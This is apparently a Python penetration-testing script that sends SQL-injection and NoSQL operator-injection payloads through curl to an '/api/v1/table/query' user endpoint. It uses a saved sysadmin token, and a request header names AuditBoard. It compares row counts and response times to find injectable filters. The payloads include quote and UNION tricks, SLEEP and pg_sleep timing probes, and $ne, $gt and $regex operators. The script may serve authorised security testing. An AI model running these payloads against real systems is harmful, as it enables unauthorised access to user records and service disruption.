import json,subprocess,os,time
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def post(path,body,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H','token: '+(tok or TOK),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-AuditBoard-Source: SchemaTable Rows','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== table/query filter operators — SQLi / operator injection ===")
base={"ab:query":{"entities":["user"],"filter":{},"include":["user"]}}
c,b=post('/api/v1/table/query?entities=user',base)
n=0
try: n=len(json.loads(b).get('included') or [])
except: pass
print(f"  baseline: {c} rows={n}")
print()
probes=[
 ("eq-normal", {"email":{"eq":"0707@soxhub.com"}}),
 ("contains", {"email":{"contains":"soxhub"}}),
 ("sqli-quote", {"email":{"eq":"' OR '1'='1"}}),
 ("sqli-union", {"email":{"eq":"x' UNION SELECT 1,2,3--"}}),
 ("sqli-sleep", {"email":{"eq":"' OR SLEEP(5)--"}}),
 ("op-injection", {"email":{"$ne":None}}),
 ("op-injection2", {"email":{"$gt":""}}),
 ("op-regex", {"email":{"$regex":".*"}}),
 ("nested-or", {"$or":[{"email":{"contains":"soxhub"}}]}),
 ("raw-sql", {"email":{"eq":"1);SELECT pg_sleep(3)--"}}),
]
for label,f in probes:
    body={"ab:query":{"entities":["user"],"filter":f,"include":["user"]}}
    t0=time.time()
    c,b=post('/api/v1/table/query?entities=user',body)
    dt=round(time.time()-t0,2)
    n2=0
    try: n2=len(json.loads(b).get('included') or [])
    except: pass
    print(f"  {label:14} {c:>4} rows={n2:<5} t={dt}s  {b[:90].replace(chr(10),' ')}")
